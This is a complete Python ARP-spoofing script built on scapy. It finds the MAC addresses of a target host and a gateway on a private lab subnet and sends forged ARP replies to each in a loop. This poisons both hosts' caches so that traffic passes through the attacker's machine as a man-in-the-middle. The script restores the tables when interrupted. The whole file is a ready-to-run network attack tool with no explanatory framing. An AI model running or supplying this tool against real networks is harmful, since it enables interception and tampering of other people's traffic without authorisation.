#!usr/bin/env python

import sys
import scapy.all as scapy
import time

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    response_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=False)[0]

    return response_list[0][1].hwsrc

def generate_packet(target_ip, spoof_ip, restore):
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)
    if restore:
        return scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    else:
        return scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)


def spoof(target_ip, spoof_ip):
    scapy.send(generate_packet(target_ip, spoof_ip, restore=False), verbose=False)

def restore(target_ip, spoof_ip):
    scapy.send(generate_packet(target_ip, spoof_ip, restore=True), count=4, verbose=False)

def start(target_ip, gateway_ip):
    packets_count = 0
    try:
        while True:
            packets_count += 2
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            print("\r[-] Packets sent: " + str(packets_count), end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("[+] Detected Ctrl + C...Restoring")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)

target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"
start(target_ip, gateway_ip)